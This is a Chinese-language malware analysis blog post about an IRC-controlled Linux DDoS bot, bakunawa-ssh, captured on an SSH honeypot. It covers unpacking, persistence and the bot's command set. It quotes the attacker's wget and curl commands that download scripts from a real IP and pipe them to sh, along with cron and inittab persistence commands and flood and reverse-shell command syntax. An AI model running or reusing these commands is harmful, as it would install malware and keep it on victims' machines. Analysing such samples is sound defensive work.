<h1 id="x00-">0x00 背景</h1>

<p>最近还是通过ssh蜜罐捕获到样本，都是通过下载sh脚本文件并执行：</p>

<div>
  <pre><code class="bash">wget -qO - http://198.1.70.128/1sh | sh &gt; /dev/null 2&gt;&amp;1 &amp;
rm -rf /var/run/1sh; wget -c http://198.1.70.128/1sh -P /var/run &amp;&amp; sh /var/run/1sh &amp;
wget -qO - http://198.1.70.128/2sh | sh &gt; /dev/null 2&gt;&amp;1 &amp;
rm -rf /tmp/2sh; wget -c http://198.1.70.128/2sh -P /tmp &amp;&amp; sh /tmp/2sh &amp;
curl http://198.1.70.128/3sh | sh
cd /dev/shm ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &amp;</code></pre>
</div>

<p>虽然这里有3个脚本文件，但通过对比下载的二进制文件md5，实际上1sh脚本中也就涵盖了各个平台下的恶意样本，逐一下载后无脑执行就可以了：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/1.png" alt="" /></p>

<h1 id="x01-">0x01 脱壳</h1>

<p>在<a href="https://www.virustotal.com/#/file/9c392a3372a6c07c0e4345b09615506f88e3870d02b6541ea3fb0650cb9286b7/details">VT</a>上也可以看到这是最近才发现的样本，但这些样本都会把主控端的ip地址硬编码至程序中，所以时间上是没有意义的，注意到该样本是经过UPX加壳处理的：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/2.png" alt="" /></p>

<p>其实一开始<code>strings -a</code>也可以发现疑似UPX压缩的迹象，在IDA打开后完全是瞎的，所以程序内部会先进行解压缩然后跳转执行真正的代码。首先尝试<code>upx -d</code>脱壳未果：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/3.png" alt="" /></p>

<p>这里当然是针对UPX的脱壳程序做了一下处理，要不然在稍微懂点的人面前加壳跟没加一样。探索一番后发现，MalwareMustDie团队已经<a href="http://blog.malwaremustdie.org/2016/04/mmd-0053-2016-bit-about-elfstd-irc-bot.html">20160416分析过</a>相似的样本，但给出的脱壳方法也不是太详细和便捷。在<a href="https://www.pediy.com/kssd/pediy10/79061.html">国内</a>也有人使用IDA远程调试然后写idc脚本去dump，然而我的IDA神一般的远程attach不上，此方法有待后续探究学习。前面的文章里有提过0x8058ac0处保存的是压缩后的数据，而且还是ELF文件开头的，那我直接gdb attach上解压缩后的程序dump内存不就好了（<code>dump memory test2 0x08048000 0x08056000</code>），机智如你：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/4.png" alt="" /></p>

<h1 id="x02-">0x02 自启动接收指令</h1>

<h2 id="section">执行命令</h2>

<p>样本会调用getuid函数判断root权限，然后用snprintf函数完成命令字符串的构造，最终通过system函数执行命令。</p>

<h2 id="section-1">进程环境设置</h2>

<ol>
  <li>调用setpriority函数设置进程谦让度为0。</li>
  <li>
    <p>将该进程设置为守护进程。</p>

    <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/5.png" alt="" /></p>
  </li>
  <li>
    <p>在127.0.0.1本地监听一个随机的端口，作为后续的互斥锁。</p>

    <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/6.png" alt="" /></p>
  </li>
  <li>执行命令<code>echo "nameserver 8.8.8.8" &gt; /etc/resolv.conf &amp;</code>。</li>
  <li>
    <p>随机strcpy以下某个字符串至argv[0]。</p>

    <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/7.png" alt="" /></p>
  </li>
</ol>

<h2 id="section-2">自启动设置</h2>

<ol>
  <li>查看对目录<code>/dev/shm/</code>、<code>/var/tmp/</code>、<code>/tmp/</code>、<code>/var/lock/</code>、<code>/var/run/</code>是否有可写入权限。这里我以<code>/w_ok/</code>代指一下。</li>
  <li>
    <p>如果存在<code>/bin/crontab</code>文件则执行如下命令，说白了就是配合上面的本地监听sock保证样本一直运行。</p>

    <pre><code> &lt;div&gt;
</code></pre>
  </li>
</ol>
<pre><code class="bash">chmod 700 /path/muhstiki386 &gt; /dev/null 2&gt;&amp;1 &amp;
        touch -acmr /bin/ls /path/muhstiki386 #需要root权限
        (crontab -l | grep -v &quot;/path/muhstiki386&quot; | grep -v &quot;no cron&quot; | grep -v &quot;lesshts/run.sh&quot; &gt; /w_ok/.x00%u) &gt; /dev/null 2&gt;&amp;1 #%u为随机的unsigned int
        echo &quot;* * * * * /path/muhstiki386 &gt; /dev/null 2&gt;&amp;1 &amp;&quot; &gt;&gt; /w_ok/.x00%u
        crontab /w_ok/.x00%u
        rm -rf /w_ok/.x00%u</code></pre>
<p>&lt;/div&gt;</p>

<ol>
  <li>
    <p>如果是root权限，则执行如下命令，使样本进程在终止后重新启动进程。</p>

    <pre><code> &lt;div&gt;
</code></pre>
  </li>
</ol>
<pre><code class="bash">cat /etc/inittab | grep -v &quot;/path/muhstiki386&quot; &gt; /etc/inittab2
        echo &quot;0:2345:respawn: /path/muhstiki386&quot; &gt;&gt; /etc/inittab2
        cat /etc/inittab2 &gt; /etc/inittab
        rm -rf /etc/inittab2
        touch -acmr /bin/ls /etc/inittab</code></pre>
<p>&lt;/div&gt;</p>

<ol>
  <li>
    <p>如果存在<code> /etc/rc.local </code>或<code> /etc/rc.conf </code>文件可读，则向其追加<code>/path/muhstiki386</code>，可是这些文件一般是以<code>exit 0</code>结束的，开发者理解水平不够呀。</p>

    <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/8.png" alt="" /></p>
  </li>
</ol>

<h2 id="section-3">接收指令</h2>

<ol>
  <li>
    <p>样本会随机连接以下的某个ip地址的9090端口，如果连接时间超过9秒则再随机选取ip地址。</p>

    <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/9.png" alt="" /></p>
  </li>
  <li>
    <p>连接上ip地址后，select的timeout时间设置为1200秒。被控端样本会拆分主控端传来的指令调用对应命令的函数指针，每条命令以’\n’分割，格式为’:arg1 cmd arg2’，或者’cmd arg2’ arg1默认为’*‘。但在分割参数时使用<code>strcpy(k, &amp;k[l + 1])</code>的方法不敢苟同。</p>

    <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/10.png" alt="" /></p>
  </li>
</ol>

<h1 id="x03-irc">0x03 IRC命令</h1>

<p>只是从逆向层面上说明每个函数指针做了什么会很生硬，应该去理解主控端的命令。其实在这里样本连接主控端接收指令，其消息的形式走的是IRC协议，会根据IRC指令来回复主控服务器。IRC协议的标准和实现可见<a href="https://groups.google.com/forum/#!topic/ircfan/5cXt1WIhpFQ">这里</a>，本地动态调试时可参考<a href="http://larry.ngrep.me/malwaremustdie-gucci-analysis.html">之前的文章</a>，使用iptables发送指令给样本执行。</p>

<h2 id="nickname">Nickname生成</h2>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/11.png" alt="" /></p>

<p>第一个%s代指本地主机的架构；%d以0或1代指是否具有root权限；然后跟着6位随机的数字；最后的%s则为成功读取的<code>/bin/uname -n</code>、<code>nvram get router_name</code>、<code>cat /etc/ISP_name</code>、<code>cat /etc/Model_name</code>的前10个字节输出，不符合对应规则的话则输出<code>unknown</code>。</p>

<h2 id="connection-registration">Connection Registration</h2>

<p>IRC客户端在连接之前需要注册nickname，设定user message，可以看到样本会将其<code>username</code>设为<code>0x00</code>，<code>realname</code>设为<code>1.0+tftp_jun112017</code>：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/12.png" alt="" /></p>

<h2 id="irc-command">IRC Command</h2>

<p>IRC消息遵循的BNF是<code>&lt;message&gt;  ::= [':' &lt;prefix&gt; &lt;SPACE&gt; ] &lt;command&gt; &lt;params&gt; &lt;crlf&gt;</code>，样本中会处理的命令如下：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/13.png" alt="" /></p>

<ol>
  <li>352：为RPL_WHOREPLY，设置nick对应的host，会用于后续功能的源ip地址伪造。</li>
  <li>
    <p>005、376、422：都会列出MOTD的内容，并且加入<code>#m.x86</code> channel。</p>

    <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/14.png" alt="" /></p>
  </li>
  <li>433、ERROR：会重新生成nickname的内容。</li>
  <li>JOIN、PING、NICK：JOIN为空函数；会用PONG指令来应答PONG；NICK可能会为客户端更改nickname。</li>
  <li>
    <p>PRIVMSG：向被控端发送指令执行功能或函数，遵循的格式为<code>[':' &lt;prefix&gt; &lt;SPACE&gt; ] #m.x86 !!nickname &lt;command&gt; &lt;params&gt; &lt;crlf&gt;</code>。command为IRC则会回传params的内容；为SH则会执行后回传命令输出；其他command则会对比调用函数指针。</p>

    <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/15.png" alt="" /></p>
  </li>
</ol>

<h1 id="x04-">0x04 恶意功能</h1>

<p>通过PRIVMSG调用的函数则是真正进行一些DOS，Downloader，SPOOF的功能，具体如下：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/16.png" alt="" /></p>

<h2 id="xmas">XMAS</h2>

<p>对指定的ip进行tcp flood攻击：</p>

<p><code>XMAS &lt;target&gt; &lt;port&gt; &lt;secs&gt; &lt;cwr,ece,urg,ack,psh,rst,fin,syn or null&gt; &lt;random/not&gt;</code></p>

<p>port为0会随机设置源端口；如果没有设置源ip netlong则会随机生成源ip；secs为攻击持续时间；根据参数设置tcp数据包的flags；random则会随机设定tcp data数据长度为[0, 20]，window size也会随机设置，否则data为20，window size为32120。</p>

<h2 id="pan">PAN</h2>

<p>对指定ip进行syn flood攻击，与XMAS相似，但源ip是完全随机的：</p>

<p><code>PAN &lt;target&gt; &lt;port&gt; &lt;secs&gt;</code></p>

<h2 id="sudp">SUDP</h2>

<p>对指定ip进行udp flood攻击，与XMAS相似，ip length设置为1500：</p>

<p><code>SUDP &lt;target&gt; &lt;port&gt; &lt;secs&gt;</code></p>

<h2 id="udp">UDP</h2>

<p>与SUDP相似，但源ip随机：</p>

<p><code>UDP &lt;target&gt; &lt;port&gt; &lt;secs&gt;</code></p>

<h2 id="std">STD</h2>

<p>对指定ip进行udp flood，data为4个字节，使用的是本地源ip：</p>

<p><code>STD &lt;target&gt; &lt;port&gt; &lt;secs&gt;</code></p>

<h2 id="std2">STD2</h2>

<p>与STD相似，data可以自定义为<code>&lt;funny_data&gt;</code>的内容：</p>

<p><code>STD2 &lt;target&gt; &lt;port&gt; &lt;secs&gt; &lt;funny_data&gt;</code></p>

<h2 id="junk">JUNK</h2>

<p>对指定ip和port进行tcp connect flood，使用1个字节的data，threads最高设置为64：</p>

<p><code>JUNK &lt;target&gt; &lt;port&gt; &lt;time&gt; &lt;threads&gt;</code></p>

<p>不过第一次见这样也算是thread 的：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/17.png" alt="" /></p>

<h2 id="unknown">UNKNOWN</h2>

<p>对指定ip进行udp flood，使用本地源ip，目的端口随机，ip length设置为9216：</p>

<p><code>UNKNOWN &lt;target&gt; &lt;secs&gt;</code></p>

<h2 id="l7unknown">L7.UNKNOWN</h2>

<p>对指定ip和port进行http flood：</p>

<p><code>l7.unknown &lt;target&gt; &lt;port&gt; &lt;time&gt; &lt;threads&gt; &lt;/shit.php?id=&gt; &lt;random/not&gt; &lt;(n if random) or not&gt; &lt;GET/HEAD/POST&gt;</code></p>

<p>threads最大为64；参数6如果为random，则会生成n（n&lt;=10）位的数字作为id值；请求头中的User-Agent会是89选1，POST数据包为1个字节：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/18.png" alt="" /></p>

<h2 id="l7unknown2">L7.UNKNOWN2</h2>

<p>与L7.UNKNOWN相似，threads最大为256，增加了host_header：</p>

<p><code> l7.unknown2 &lt;targetip&gt; &lt;host_header&gt; &lt;port&gt; &lt;time&gt; &lt;threads&gt; &lt;/shit.php?id=&gt; &lt;random/not&gt; &lt;(n if rand om) or not&gt; &lt;GET/HEAD/POST&gt;</code></p>

<h2 id="dns">DNS</h2>

<p>解析某一host：</p>

<p><code> DNS &lt;host&gt;</code></p>

<h2 id="cback">CBACK</h2>

<p>向指定ip和port回传shell：</p>

<p><code> CBACK &lt;ip&gt; &lt;port&gt;</code></p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/19.png" alt="" /></p>

<h2 id="killall">KILLALL</h2>

<p>在执行每个指令时客户端都会fork子进程执行并记录其pid，KILLALL就是kill掉所有记录的子进程：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/20.png" alt="" /></p>

<h2 id="spoofs">SPOOFS</h2>

<p>接收参数则会设置netlong为对应的subnet address，当没有参数时则会移除netlong。</p>

<h2 id="getspoofs">GETSPOOFS</h2>

<p>获取当前spoof的netlong范围。</p>

<h2 id="get">GET</h2>

<p>http downloader:</p>

<p><code> GET &lt;host&gt; &lt;save as&gt;</code></p>

<h2 id="server">SERVER</h2>

<p>可以更换客户端中主控端的ip地址。</p>

<h2 id="version">VERSION</h2>

<p>原来你的名字是——bakunawa-ssh™：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/21.png" alt="" /></p>

<h2 id="help">HELP</h2>

<p>大体功能简介：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/22.png" alt="" /></p>

<h2 id="shelp">SHELP</h2>

<p>ssh扫描功能，但样本中未发现具体实现：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/23.png" alt="" /></p>

<h2 id="dhelp">DHELP</h2>

<p>DDOS功能的介绍，和前文一样：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/24.png" alt="" /></p>

<h1 id="x05-">0x05 总结</h1>

<p>bakunawa-ssh™这个样本经过UPX加壳，并针对于UPX的脱壳过程动了些手脚，其实样本的开始还是有反调试的：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/25.png" alt="" /></p>

<p>碰巧gdb attach一起绕过了。被控端连接硬编码的IRC主控端服务器，使用IRC协议来传递消息执行DDOS、反弹shell、Downloader等功能。通过其版本号<code>1.0+tftp_jun112017</code>，可以知道这是今年中旬的样本，也捕获过其他该样本的老版本：</p>

<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20171219/26.png" alt="" /></p>

<p>所以该样本肯定是在不断地编程发展，可以监控主控端的指令做进一步的感知，针对恶意软件elf文件的解构知识也需加强。</p>

